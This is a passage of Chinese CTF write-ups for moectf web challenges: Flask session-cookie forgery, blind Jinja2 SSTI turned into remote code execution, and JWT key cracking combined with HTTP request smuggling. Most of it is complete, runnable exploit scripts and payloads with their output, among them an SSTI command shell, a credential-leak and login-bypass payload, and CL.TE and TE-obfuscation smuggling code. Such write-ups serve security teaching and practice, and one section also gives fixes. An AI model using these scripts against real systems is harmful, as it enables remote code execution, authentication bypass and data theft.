cookie = <b64_payload>.<b64_timestamp>.<b64_signature>
```

1. payload：session 内容 {"token":"admin"} → JSON bytes → URLSafe base64 编码（去 padding）。
   - Flask 3.x 的 `TaggedJSONSerializer.dumps` 已经不再把字符串包装成 `{"t": "..."}`，直接 JSON 即可。
2. timestamp：带上"签发时间"以便服务器判断过期，`struct.pack(">Q", ts).lstrip(b"\x00")` → URLSafe base64（去 padding）。
   - 注意是去前导零后再 base64，不是固定 8 字节！
3. key 派生：hmac模式`signer_kwargs = {"key_derivation": "hmac", "digest_method": sha1}`，算法是：
   ```
   derived_key = HMAC-SHA1(secret_key, salt=b"cookie-session")
   ```

```http
GET /user HTTP/1.1
Host: 127.0.0.1:59490
Cookie: session=eyJ0b2tlbiI6ImFkbWluIn0.aqIbKA.rsNdOhBp2T_d8ZZ0_qVtEvkuBS0
```

响应：
```json
{"info":"moectf{7d5fb0c1-de5b-d04d-9be5-040c5807672c}","username":"admin"}
```

攻击脚本：
```python
import urllib.request
import urllib.parse
import json
import hmac
import hashlib
import base64
import re
import time

URL = "http://127.0.0.1:59490"
SALT = b"cookie-session"  # Flask SecureCookieSessionInterface 默认 salt

# 显式绕开本机环境里的 HTTP_PROXY，否则 urllib 会走代理连目标
OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def post_form(path, fields):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(f"{URL}{path}", data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    return OPENER.open(req).read().decode()


def get_with_cookie(path, cookie):
    req = urllib.request.Request(f"{URL}{path}")
    req.add_header("Cookie", f"session={cookie}")
    return OPENER.open(req).read().decode()


# -------- 1. SSTI 读出 SECRET_KEY --------
resp = post_form("/login", {"username": "{{config}}", "password": "x"})

# 响应里 SECRET_KEY 是被 HTML escape 过的：&#39;SECRET_KEY&#39;: &#39;...&#39;
m = re.search(r"SECRET_KEY(?:&#39;|\"):\s*(?:&#39;|\")([0-9a-f]{64})(?:&#39;|\")", resp)
SECRET_KEY = m.group(1)
print(f"[+] SECRET_KEY = {SECRET_KEY}")


# -------- 2. 用 SECRET_KEY 伪造 Flask session --------
# Flask 3.x SecureCookieSessionInterface 默认走：
#   URLSafeTimedSerializer + TaggedJSONSerializer（新版不再把字符串 tag 成 {"t": ...}）
#   salt        = "cookie-session"
#   signer_kwargs = {"key_derivation": "hmac", "digest_method": hashlib.sha1}
# cookie 形如：payload.timestamp.signature（TimestampSigner）

session_dict = {"token": "admin"}              # 直接 JSON，字符串值不再被 tag
inner = json.dumps(session_dict, separators=(",", ":")).encode()   # b'{"token":"admin"}'
# itsdangerous URLSafeSerializerMix 会把 inner 做 base64(url-safe, 去 pad)
payload = base64.urlsafe_b64encode(inner).rstrip(b"=")

# key 派生：itsdangerous 的 "hmac" 模式下 derived_key = HMAC-SHA1(secret_key, salt)
# （注意：不是 django-concat 模式的 sha1(salt + b"signer" + secret_key)！）
derived_key = hmac.new(SECRET_KEY.encode(), digestmod=hashlib.sha1)
derived_key.update(SALT)
derived_key = derived_key.digest()

# timestamp 段：itsdangerous 用 struct.pack(">Q", ts).lstrip(b"\x00") 再 base64 去 pad
# 用真实当前时间戳，让 max_age 检查不出问题
ts_int = int(time.time())
ts_bytes = ts_int.to_bytes(8, "big").lstrip(b"\x00") or b"\x00"
ts_b64 = base64.urlsafe_b64encode(ts_bytes).rstrip(b"=")

# Signature：HMAC-SHA1(derived_key, payload + "." + ts_b64, sha1)
# （itsdangerous "hmac" 模式 + 默认 algorithm=None：签名输入不拼 salt）
signed_value = payload + b"." + ts_b64
sig = hmac.new(derived_key, msg=signed_value, digestmod=hashlib.sha1).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=")

session_cookie = (signed_value + b"." + sig_b64).decode()
print(f"[+] forged session cookie = {session_cookie}")


# -------- 3. 带伪造 session 访问 /user --------
resp2 = get_with_cookie("/user", session_cookie)
print(f"[+] /user 响应: {resp2}")

# 提取 flag
m2 = re.search(r'"info":\s*"([^"]+)"', resp2)
if m2:
    print(f"\n[FLAG] {m2.group(1)}")
else:
    print("\n[!] 没拿到 flag，请检查上面的响应")
```

---

# 旧能源管理系统

## 某某大专为高四学生开发了一款系统用于课程复习，但是系统不太完善，目前只能登录

## 源码：
```python
import secrets

from flask import Flask, render_template, render_template_string, request


app = Flask(__name__)


LOGIN_USERNAME = str(secrets.randbelow(9_000_000) + 1_000_000)
LOGIN_PASSWORD = secrets.token_urlsafe(18)


def render_login_name(source: str) -> None:
    try:
        render_template_string(source)
    except Exception:
        pass


def exact_match(candidate: str, expected: str) -> bool:
    return secrets.compare_digest(candidate.encode(), expected.encode())


@app.route("/", methods=["GET", "POST"])
def index():
    status = None

    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        render_login_name(username)

        if exact_match(username, LOGIN_USERNAME) and exact_match(
            password, LOGIN_PASSWORD
        ):
            status = "登录成功"
        else:
            status = "登录失败"

    return render_template("index.html", status=status)


@app.errorhandler(413)
def request_too_large(_error):
    return render_template("index.html", status="登录失败"), 413


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=20006, debug=False, threaded=True)
```

从源码可以知道以下信息
| 信息 | 含义 |
| --- | --- |
| `render_template_string(username)` | **SSTI（服务端模板注入）**，用户输入被当作 Jinja2 模板执行 |
| `render_template_string` 的返回值**没被使用** | 注入结果不进页面，没有直接回显 |
| `except Exception: pass` | 报错也看不到，`{{ 1/0 }}` 这类探测全部哑火 |
| 凭据是 import 时随机生成的 | 爆破没意义，只能从内存里偷或改 |

说明这是一个"盲"的 SSTI —— 能执行代码，但执行结果你看不见。

`username`实际上是一个代码输入框

要求出这类题目就先要找回显，
### 下面列举了一些找回显的方法
| 档 | 工具 | 什么时候用 | 短板 |
| --- | --- | --- | --- |
| 零安装 | **浏览器 + F12** | 先试一发验证猜想 | 不能循环、不能自动重试 |
| 命令行 | **curl** | 验证一次、抄进 writeup | 逻辑一复杂就写不下去 |
| 可视化 | **Burp Suite / Yakit** | 反复改参数、逐字节对比响应 | 重活，需抓包配置 |
| 脚本 | **Python / Node / Go / PHP / bash** | 要重试、编码、循环、并发 | 要写代码 |
| 扫描器 | **sqlmap / SSTImap / nuclei / ffuf** | 认题型的标准化漏洞、批量打 | 认不出题型就白搭 |

#### 浏览器（最容易被忽略）

表单本身就是 HTTP 客户端，用户名框直接贴 payload 提交即可：

- F12 → Network → 那条 POST → Response Headers 找 `Set-Cookie`
- Application → Cookies → `session`
- Console 里 `atob("eyJyIjoi...")` 直接解 base64（Flask session 只签名不加密）

#### curl 一条命令

```bash
PAY='{% set _ = config.update(SECRET_KEY="x") %}{% for c in "".__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == "_wrap_close" %}{% set m = c.__init__.__globals__ %}{% set _ = session.__setitem__("r", m.popen("printenv FLAG").read()) %}{% endif %}{% endfor %}'

curl -s --retry 3 --retry-all-errors -D - -o /dev/null \
  -X POST 'http://127.0.0.1:<PORT>/' \
  --data-urlencode "username=$PAY" --data-urlencode 'password=a' \
| grep -io 'session=[^;]*' | head -1 \
| sed 's/session=//; s/^\.//' | cut -d. -f1 | tr '_-' '/+' | base64 -d
```

- `--data-urlencode` 自动做百分号编码（手编 payload 会疯）
- `sed 's/^\.//'` 去掉 Flask 的 zlib 压缩前缀，去掉后第一段才是载荷
- `tr '_-' '/+'` 把 URL-safe base64 换回标准表，`base64 -d` 才能解

#### nc 手写 HTTP 报文（理解本质）

HTTP 就是纯文本，可以一个字节一个字节地敲：

```bash
# 借 curl 生成编码后的报文体，省得手编百分号
BODY=$(curl -Gs -o /dev/null -w '%{url_effective}' \
        --data-urlencode "username=$PAY" --data-urlencode 'password=a' http://x/ | cut -d? -f2)

{ printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1:%s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' "$PORT" ${#BODY}
  printf '%s' "$BODY"; } | nc 127.0.0.1 "$PORT"
```

#### 其他语言发包（思路完全一致）

| 语言 | 写法 |
| --- | --- |
| Node | `fetch(url,{method:'POST',body:new URLSearchParams({username:pay,password:'a'})})` |
| Go | `http.Post(url,"application/x-www-form-urlencoded",strings.NewReader(body))` |
| PHP | `file_get_contents($url,false,stream_context_create(['http'=>['method'=>'POST','content'=>$body]]))` |
| bash | `curl` 套 `for` 循环，短逻辑够用 |

#### python脚本
```python
import sys
import time
import urllib.parse
import urllib.request

URL = "http://127.0.0.1:51652/"


def send(payload: str, password: str = "a") -> tuple:
    """返回 (HTTP 状态码, 响应头里的 Set-Cookie, 页面 HTML, 耗时秒数)"""
    data = urllib.parse.urlencode({"username": payload, "password": password}).encode()
    req = urllib.request.Request(
        URL,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Accept": "*/*"},
    )
    t0 = time.time()
    with urllib.request.urlopen(req, timeout=60) as resp:
        html = resp.read().decode("utf-8", "ignore")
        return resp.status, resp.headers.get("Set-Cookie", ""), html, time.time() - t0


def l1_output_diff(poc: str) -> bool:
    """L1：注入前后页面正文是否不同"""
    _, _, base, _ = send("baseline_probe_123")          # 基线：一个普通用户名
    _, _, test, _ = send(poc)                            # 注入：算术表达式
    same = base == test
    print(f"  [L1] 注入 {poc!r}")
    print(f"       与基线页面完全一致 = {same}  →  {'无输出型回显' if same else '有回显！'}")
    return not same


def l2_time_echo(seconds: int = 3) -> float:
    """L2：让目标 sleep N 秒，看响应时间是否变长 → 证明代码确实被执行了"""
    poc = (
        '{%% for c in "".__class__.__mro__[1].__subclasses__() %%}'
        '{%% if c.__name__ == "_wrap_close" %%}'
        "{%% set m = c.__init__.__globals__ %%}"
        '{%% set _ = m.system("sleep %d") %%}'
        "{%% endif %%}{%% endfor %%}" % seconds
    )
    _, _, _, t_plain = send("baseline_probe_123")
    _, _, _, t_sleep = send(poc)
    delta = t_sleep - t_plain
    print(f"  [L2] 注入 sleep {seconds}")
    print(f"       基线 {t_plain:.2f}s → 注入后 {t_sleep:.2f}s，差 {delta:+.2f}s")
    print(f"       → {'代码执行了（盲注入：能跑但看不见）' if delta > seconds * 0.6 else '代码没执行 / 被过滤'}")
    return delta


def l3_out_of_band(cmd: str = "printenv FLAG") -> str:
    """L3：自己造通道 —— 把执行结果写进 session cookie 带回来"""
    poc = (
        '{%% set _ = config.update(SECRET_KEY="x") %%}'
        '{%% for c in "".__class__.__mro__[1].__subclasses__() %%}'
        '{%% if c.__name__ == "_wrap_close" %%}'
        "{%% set m = c.__init__.__globals__ %%}"
        '{%% set _ = session.__setitem__("r", m.popen(%s).read()) %%}'
        "{%% endif %%}{%% endfor %%}" % repr(cmd).replace("'", '"')
    )
    import base64, json, zlib

    for attempt in range(4):          # 靶机会偶发抖动，多试几次
        _, cookie, _, _ = send(poc)
        if "session=" not in cookie:
            continue
        raw = cookie.split("session=", 1)[1].split(";", 1)[0]
        parts = raw.split(".")
        body = parts[1] if parts[0] == "" else parts[0]   # 以 '.' 开头 = zlib 压缩过
        body += "=" * (-len(body) % 4)
        blob = base64.urlsafe_b64decode(body)
        if parts[0] == "":
            blob = zlib.decompress(blob)
        out = json.loads(blob).get("r", "")
        print(f"  [L3] 带外通道取回 {len(out)} 字节：{out.strip()[:120]}")
        return out
    print("  [L3] 重试 4 次仍没拿到 Set-Cookie，通道未打通")
    return ""


if __name__ == "__main__":
    print("=== 三层探测：判断这个注入点有没有回显 ===")
    has_echo = l1_output_diff("{{ 7*7 }}")
    l2_time_echo(3)
    if not has_echo:
        l3_out_of_band(sys.argv[1] if len(sys.argv) > 1 else "printenv FLAG")
```

结果没有回显，那就造一条回显通道。Flask 的 session 是客户端 cookie：

- 模板里拿到的 `session` **就是本次请求真正的那个 session 对象**（不是副本）；
- 对它写入后，Flask 在返回响应时会把整个 session **签名后写进 `Set-Cookie`**；
- Flask session 只**签名**不**加密**，base64 解出来就是明文 JSON。

于是：

```
模板里 session['r'] = 命令执行结果
        ↓
响应头 Set-Cookie: session=<base64(明文JSON)>.时间戳.签名
        ↓
我们自己 base64 解码 → 看到结果
```


但是`session.update()` 不生效！

```jinja
{% set _ = session.update(r=xxx) %}     ← 拿不到 cookie
{% set _ = session.__setitem__("r", xxx) %}  ← 正确
```

Flask 的 session 是 `CallbackDict` 子类，靠重写 `__setitem__` 来打「已修改」标记。
而 CPython 里 `dict.update()` 走 C 层实现，**不会调用子类重写的 `__setitem__`**，
所以 `modified` 一直是 False，Flask 就认为"session 没动过"，不下发 cookie。

并且没有 SECRET_KEY

源码里没设 `app.secret_key`，session 一被修改，`save_session` 就会抛
`RuntimeError: The session is unavailable because no secret key was set`。
解决办法很直接 —— 在模板里顺手给它设一个：

```jinja
{% set _ = config.update(SECRET_KEY="x") %}
```

从模板摸到 `os`：拿到命令执行

Jinja 里没有 `os`，要靠 Python 的继承链去找：

```jinja
{% for c in "".__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == "_wrap_close" %}
    {% set m = c.__init__.__globals__ %}
    {% set _ = session.__setitem__("r", m.popen("id").read()) %}
  {% endif %}
{% endfor %}
```

拆解：

| 片段 | 含义 |
| --- | --- |
| `"".__class__` | 字符串类 `str` |
| `.__mro__[1]` | 父类 `object` |
| `.__subclasses__()` | 当前进程里**所有**类的列表（实测 529 个，能拿到很多内置类） |
| `c.__name__ == "_wrap_close"` | `os` 模块里定义的一个类 |
| `c.__init__.__globals__` | **这个类所在模块的全局命名空间**，也就是 `os` 模块自己的字典 |
| `m.popen(...)` | 就是 `os.popen(...)` |

不要再写 `['os']`

第一次我写的是 `c.__init__.__globals__["os"]`，结果**没有任何 cookie**。
原因：`_wrap_close` 本身就定义在 `os.py` 里，它的 `__globals__` 已经是 os 的命名空间了，
里面根本没有叫 `os` 的键（`os` 模块不会 import 自己）→ KeyError → 被 `except` 吞掉 → 静默失败。

cookie 太长时会被 zlib 压缩

内容一长，Flask 会压缩 session，并在最前面补一个 `.` 做标记：

```
普通：eyJyIjoiLi4uIn0.aqPD.A8Ji...
压缩：.eJxdzdEKgjAUgOFX...      ← 第一段是空串！
```

所以解析时不能无脑 `split('.')[0]`，要先判断是否以 `.` 开头，是就取第二段并 `zlib.decompress`。
（这个坑害我 `split('.')[0]` 拿到空串，脚本一直返回 `{}`，排查了半天。）

最后得到完整可以使用的脚本
```python
import base64
import json
import sys
import urllib.parse
import urllib.request
import zlib

URL = "http://127.0.0.1:51652/"
SECRET_KEY = "x"


RETRY = 4  # 目标偶发抖动（有时会拖到 8s+ 甚至不落 cookie），失败就重来


def _send(payload: str, password: str) -> tuple:
    """发一次请求，返回 (Set-Cookie 原文, 页面 HTML)"""
    data = urllib.parse.urlencode({"username": payload, "password": password}).encode()
    req = urllib.request.Request(
        URL,
        data=data,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
        },
    )
    with urllib.request.urlopen(req, timeout=40) as resp:
        return resp.headers.get("Set-Cookie", ""), resp.read().decode("utf-8", "ignore")


def decode_session(cookie: str) -> dict:
    """
    解 Flask session cookie：base64payload.时间戳.签名
    注意：内容较长时 Flask 会 zlib 压缩，并在开头补一个 '.' 做标记，
    这时第一段是空串，真正的载荷在第二段。
    """
    if "session=" not in cookie:
        return {}
    raw = cookie.split("session=", 1)[1].split(";", 1)[0]
    parts = raw.split(".")
    body = parts[1] if parts[0] == "" and len(parts) > 1 else parts[0]
    compressed = parts[0] == ""
    body += "=" * (-len(body) % 4)
    blob = base64.urlsafe_b64decode(body)
    if compressed:
        blob = zlib.decompress(blob)
    return json.loads(blob)


def post(payload: str) -> str:
    """发登录请求，返回本响应里 session cookie 的明文 dict"""
    for _ in range(RETRY):
        cookie, _ = _send(payload, "a")
        if "session=" not in cookie:
            continue
        try:
            return decode_session(cookie)
        except Exception:
            continue
    return {}


def build(cmd: str) -> str:
    """构造：拿到 os 模块命名空间 -> 执行命令 -> 结果塞进 session"""
    return (
        '{%% set _ = config.update(SECRET_KEY="%s") %%}'
        '{%% for c in "".__class__.__mro__[1].__subclasses__() %%}'
        '{%% if c.__name__ == "_wrap_close" %%}'
        "{%% set m = c.__init__.__globals__ %%}"
        '{%% set _ = session.__setitem__("r", m.popen(%s).read()) %%}'
        "{%% endif %%}{%% endfor %%}"
    ) % (SECRET_KEY, json.dumps(cmd))  # json.dumps 负责把命令转成安全的 Jinja 字符串字面量


def build_leak() -> str:
    """构造：只回显 app.py 里的用户名 / 密码"""
    return (
        '{%% set _ = config.update(SECRET_KEY="%s") %%}'
        '{%% set g = url_for.__self__.view_functions["index"].__globals__ %%}'
        '{%% set _ = session.__setitem__("u", g["LOGIN_USERNAME"]) %%}'
        '{%% set _ = session.__setitem__("p", g["LOGIN_PASSWORD"]) %%}'
    ) % SECRET_KEY


def build_bypass() -> str:
    """
    构造：单请求登录绕过。
    把正确答案改成「本次请求自己提交的 username / password」，
    这样 exact_match 必然相等，直接 登录成功。
    好处：不依赖多 worker 之间状态一致（凭据是每个进程 import 时各自生成的）。
    """
    return (
        '{% set g = url_for.__self__.view_functions["index"].__globals__ %}'
        '{% set _ = g.update(LOGIN_USERNAME=request.form["username"],'
        ' LOGIN_PASSWORD=request.form["password"]) %}'
    )


def login(payload: str, password: str) -> str:
    """发登录请求，返回页面上的状态文字"""
    for _ in range(RETRY):
        _, html = _send(payload, password)
        if "登录成功" in html:
            return "登录成功"
    return "登录失败"


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    if sys.argv[1] == "--module":
        print(post(build_leak()))
    elif sys.argv[1] == "--bypass":
        print(login(build_bypass(), sys.argv[2] if len(sys.argv) > 2 else "pwned"))
    else:
        print(post(build(" ".join(sys.argv[1:]))).get("r", "(无回显，命令可能执行失败)"))
```
使用方法：
```bash
python3 ssti_shell.py "printenv FLAG"   # 一次性拿 flag
python3 ssti_shell.py --module          # 偷出真实用户名/密码
python3 ssti_shell.py --bypass          # 直接登录成功（见第六节）
python3 ssti_shell.py "id; ls -a /app"  # 任意命令
```

实跑结果：

```
bypass : 登录成功
creds  : {'p': 'pwned', 'u': '{% set g = url_for... %}'}
flag   : moectf{6501c774-a778-df8f-8b69-699ce08e90e2}
whoami : uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```
flag 不在页面上（登录成功页只把「登录失败」改成「登录成功」），
而是躺在**环境变量**里，所以必须走到 RCE 才能看见：

```
$ env | grep -i flag
FLAG=moectf{6501c774-a778-df8f-8b69-699ce08e90e2}
```

### 还有另一种方法：
单请求登录绕过（不偷密码）

改思路 —— 不去猜正确答案，而是**把"正确答案"改成我提交的内容**：

```jinja
{% set g = url_for.__self__.view_functions["index"].__globals__ %}
{% set _ = g.update(LOGIN_USERNAME=request.form["username"],
                    LOGIN_PASSWORD=request.form["password"]) %}
```

- `view_functions["index"]` 是 `index` 这个函数对象，`.__globals__` 就是 **app.py 的模块全局字典**；
- `g.update(...)` 直接改掉了 `LOGIN_USERNAME` / `LOGIN_PASSWORD` 这两个全局变量；
- 值取 `request.form["username"]`，也就是**本次请求自己发的那个 payload 字符串**（模板里能读到 `request`，所以可以自引用）；
- 渲染结束后回到 `index()` 继续比对的，正是这两个被改过的变量 → 必然相等 → **登录成功**。

关键点：**渲染发生在比对之前**（`render_login_name` 在 `exact_match` 前面），一次请求内就能闭环。

> 为什么不用"偷到密码再登录"？
> gunicorn 多 worker 时，每个进程 import 时生成的随机凭据**各不相同**，
> 偷到的密码只对刚才那个 worker 有效，下次请求可能落到别的 worker 上。
> 自引用绕过只在处理本次请求的那个 worker 上改状态，100% 命中。
> 副作用：该 worker 的用户名会被永久改成那串 payload（所以我后来 `--module` 偷出来的 `u` 是一段模板代码）。

漏洞修复
1. **永远不要用 `render_template_string()` 渲染用户输入**，改用 `render_template()` + 固定模板文件；
2. 真要动态内容，就用 `{{ username }}` 传参，让 Jinja 自动转义，而不是把输入当模板源码；
3. 上 `jinja2.sandbox.SandboxedEnvironment`，禁掉 `__class__` / `__globals__` 这类属性访问；
4. 单独设 `app.secret_key`（从环境变量读取），且不要放进源码；
5. 别把 flag / 密钥塞进环境变量后再开 RCE 口子 —— 本题只要有 SSTI，env 就是透明的。

---

# 黑市走私

## 你需要获取flag！

## 但是flag被市场明令禁止流通，或许……你可以问问黑商？

首页给了提示`如果你和黑商间的交流出现了一些问题，不妨问问我们的引路人 “/hint”`
首页给了 4 个入口，其实就是 4 条线索：

| 入口 | 线索 |
|---|---|
| `/stage1` | “先让**柜台**只看货箱长度，再让**后仓**按**分块**清点” → 前端认 `Content-Length`、后端认 `Transfer-Encoding` → **CL.TE 走私** |
| `/stage2` | “连信封上的冒号都喜欢挪半步”、“Transfer-Encoding 后的**空隙**” → `Transfer-Encoding : chunked`（冒号前多一个空格）→ **TE 混淆走私** |
| `/flag1` `/flag2` | 直接访问 → 403 “禁售品巡逻队已抵达” —— 正面硬闯会被拦，必须走私 |
| `/hint` | 给出 guest JWT 和密钥字典 |

`/hint` 页面是全部谜题的关键，它给了三样东西：

1. **一张普通入场券**（完整的 HS256 JWT）
2. **一份暗语字典**：`MoeCTF / xdu / xidian / xdsec / L / welcome / happy / fish`
3. **高级买家票的规格**：`role=admin` 且 `scope=flags`

先看普通入场卷
```
header    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
payload   eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJndWVzdCIsInNjb3BlIjoicmVhZCJ9
signature CG6d0k62ZfRAcq9kdqz3TQIZ6irniRCrQLyqh9WbnM8
```
两个`eyJ`开头，前两段解出来是json，最后一段解出来是乱码，符合`JWT`
base64 解一下 header和payload：

```json
{"alg":"HS256","typ":"JWT"} 
{"sub":"traveler","role":"guest","scope":"read"}
```
JWT 的签名算法是 `HS256` = **HMAC-SHA256(密钥, "header.payload")**。

也就是说：只要知道密钥，就能自己签任意 payload。而 `/hint` 已经把候选密钥列出来了 —— 从暗语字典里直接爆破。

```python
import hmac, hashlib, base64

def crack_jwt(token, wordlist):
    header, payload, sig = token.split(".")
    signing_input = f"{header}.{payload}".encode()
    for word in wordlist:
        cand = base64.urlsafe_b64encode(
            hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
        ).decode().rstrip("=")          # 注意：base64url 且去掉 '=' 填充
        if cand == sig:
            return word
    return None
```

结果：**密钥 = `fish`**（就是字典里的最后一个词）。

把 payload 换成题目要求的规格，再用 `fish` 签名：

```python
payload = {"sub": "traveler", "role": "admin", "scope": "flags"}
token   = make_jwt(payload, key=b"fish")
```

到此，票据到手。但它**还不能直接用** —— 因为正面访问 `/flag1` 会被巡逻队拦下。

看页面的提示
```
我会让 CL 小弟去跟你说，到时候让他和 TE 联系就好
先让柜台只看货箱长度，再让后仓按分块清点
记得带上能证明你是高级买家的票据
```
说明这里是CL.TE走私，前端和后端对请求的理解不一样
意味着我要在CL写整个报文的长度让前端读到完整代码，TE就写一部份长度，好让我的攻击能绕开后端的防护机制
```
POST /stage1 HTTP/1.1
Host: 127.0.0.1:52690
Content-Length: 175          ← 前端只看它：整段 body 都转发过去
Transfer-Encoding: chunked   ← 后端只看它：按分块读

0\r\n\r\n                    ← 后端认为 body 到此结束
GET /flag1 HTTP/1.1\r\n      ← 剩下的字节被后端当成「下一个请求」！
Host: 127.0.0.1\r\n
Authorization: Bearer eyJ...\r\n
\r\n
```

- **前端**：只数 `Content-Length` 个字节 → 认为请求完整 → 把整段（含走私内容）转给后端。它眼里这只是个普通的 `POST /stage1`，放行。
- **后端**：看到 `Transfer-Encoding: chunked` → 读到 `0\r\n\r\n` 就结束 → 缓冲区里剩下的 `GET /flag1 ...` 被当作**一个新的请求**执行。

于是 `GET /flag1` 成功抵达后端，且**没经过前端的路径检查**。

看第二个黑商
```
两边都认识 TE 的名号，可他们读招牌的脾气不同。让前门觉得这不是那张招牌，让后门照常按 TE 的规矩收货
Transfer-Encoding 后的空隙，可能就是黑市小巷
```
做法是给 header 名做手脚，利用提示说的空隙：

```
Transfer-Encoding : chunked     ← 冒号前面多一个空格
```

- **前门（前端）**：严格匹配 `Transfer-Encoding:`，多一个空格就认不出来，于是退化到只信 `Content-Length` → 整段转发。
- **后门（后端）**：宽松解析，照样识别成 chunked → 在 `0\r\n\r\n` 处截断。

走私早早就成功了，但返回的永远是：

```
403 票据无效
黑商看了看你的票据：这不是高级买家的印章。
```

这意味着**走私链路是通的**（响应已经不是前端的“巡逻队”页面，而是后端的“黑商”页面），只是**票据没被读到**。

于是开始枚举 —— 这题的隐藏考点就在这里：

| 放法 | 结果 |
|---|---|
| `Cookie: token=<JWT>` | 403 票据无效 |
| `Cookie: jwt / auth / session / ticket / pass / flag=<JWT>` | 403 票据无效 |
| `Cookie: <JWT>`（裸放） | 403 票据无效 |
| `X-Token / X-Auth-Token / X-JWT / X-Access-Token` | 403 票据无效 |
| `Authorization: <JWT>`（不带 Bearer） | 403 票据无效 |
| `/flag1?token=<JWT>`、`/flag1/<JWT>` | 200 但返回的是 stage1 首页（路径不匹配） |
| **`Authorization: Bearer <JWT>`** | ✅ **200 OK，`text/plain`，27 字节** |

一行 `Authorization: Bearer` 就是全部答案。前 6 种和它长得都差不多，所以只能靠**枚举 + 响应差分**来定位，靠猜很难。

得到脚本：
```python
import socket
import hmac
import hashlib
import base64
import json
import re
import time

# ---------- 靶场地址 ----------
HOST = "127.0.0.1"
PORT = 52690


# ---------- JWT 工具 ----------
def b64u(raw: bytes) -> str:
    """JWT 用的 base64url 编码: 去掉 '=' 填充"""
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def make_jwt(payload: dict, key: bytes = b"fish") -> str:
    """用 HS256 + 指定密钥签一个 JWT"""
    header = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    body = b64u(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header}.{body}".encode()
    sig = base64.urlsafe_b64encode(hmac.new(key, signing_input, hashlib.sha256).digest()).decode().rstrip("=")
    return f"{header}.{body}.{sig}"


def crack_jwt(token: str, wordlist) -> bytes:
    """拿字典爆破 HS256 密钥: 谁的签名和原 token 一致就是谁"""
    header, payload, sig = token.split(".")
    signing_input = f"{header}.{payload}".encode()
    for word in wordlist:
        cand = base64.urlsafe_b64encode(
            hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
        ).decode().rstrip("=")
        if cand == sig:
            return word.encode()
    return None


# ---------- 请求走私 ----------
def smuggle(path: str, stage: str, te_header: str, token: str, tries: int = 4, wait: float = 3.0):
    """
    一次 CL.TE / TE 混淆走私

    报文结构:
        POST /stage1 HTTP/1.1          <-- 前端只数 Content-Length, 整段转发
        Host: ...
        Content-Length: <body 全长>
        Transfer-Encoding: chunked    <-- 后端按分块解析

        0\\r\\n\\r\\n                      <-- 后端认为 body 到此结束
        GET /flag1 HTTP/1.1\\r\\n          <-- 剩下的字节被后端当成"下一个请求"
        Host: ...\\r\\n
        Authorization: Bearer <JWT>\\r\\n
        \\r\\n

    返回 (状态行, 走私请求的响应正文)
    """
    # 内层(走私)请求: 票据必须用 Authorization 头, 这是枚举出来的唯一生效位置
    inner = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Authorization: Bearer {token}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    body = ("0\r\n\r\n" + inner).encode()

    # 外层(前端)请求: Content-Length 覆盖整段 body, 保证走私内容被完整转发
    head = (
        f"POST {stage} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"{te_header}\r\n"
        f"\r\n"
    ).encode()

    raw = b""
    for _ in range(tries):
        try:
            sock = socket.create_connection((HOST, PORT), timeout=6)
            sock.sendall(head + body)
            sock.settimeout(wait)
            raw = b""
            while True:
                chunk = sock.recv(65535)
                if not chunk:
                    break
                raw += chunk
            sock.close()
            # 正常走私会拿到两个响应(表层页面 + 走私结果)
            if raw.count(b"HTTP/1.1") >= 2:
                break
        except Exception:
            pass
        time.sleep(0.3)

    parts = re.split(rb"(?=HTTP/1\.1 \d)", raw)
    last = parts[-1] if parts else b""
    status = last.split(b"\r\n", 1)[0].decode("utf-8", "ignore")
    body_bytes = last.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in last else last
    return status, body_bytes.decode("utf-8", "ignore")


# ---------- 主流程 ----------
if __name__ == "__main__":
    # 1) /hint 页面给出的普通入场券 + 暗语字典
    guest = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
             ".eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJndWVzdCIsInNjb3BlIjoicmVhZCJ9"
             ".CG6d0k62ZfRAcq9kdqz3TQIZ6irniRCrQLyqh9WbnM8")
    wordlist = ["MoeCTF", "xdu", "xidian", "xdsec", "L", "welcome", "happy", "fish",
                "moectf", "MOECTF", "secret", "key"]

    key = crack_jwt(guest, wordlist)
    print(f"[+] JWT 密钥 = {key.decode() if key else '未找到'}")

    # 2) 伪造高级买家票据
    token = make_jwt({"sub": "traveler", "role": "admin", "scope": "flags"}, key)
    print(f"[+] 高级票据   = {token[:30]}...")
    print()

    # 3) stage1: CL.TE 走私 -> /flag1
    st, body = smuggle("/flag1", "/stage1", "Transfer-Encoding: chunked", token)
    print(f"[stage1 CL.TE ] {st} -> {body.strip()}")

    # 4) stage2: Transfer-Encoding 冒号前加空格(混淆)走私 -> /flag2
    st, body = smuggle("/flag2", "/stage2", "Transfer-Encoding : chunked", token)
    print(f"[stage2 TE混淆] {st} -> {body.strip()}")
```
脚本运行结果

```bash
$ python3 exploit.py
[+] JWT 密钥 = fish
[+] 高级票据   = eyJhbGciOiJIUzI1NiIsInR5cCI6Ik...

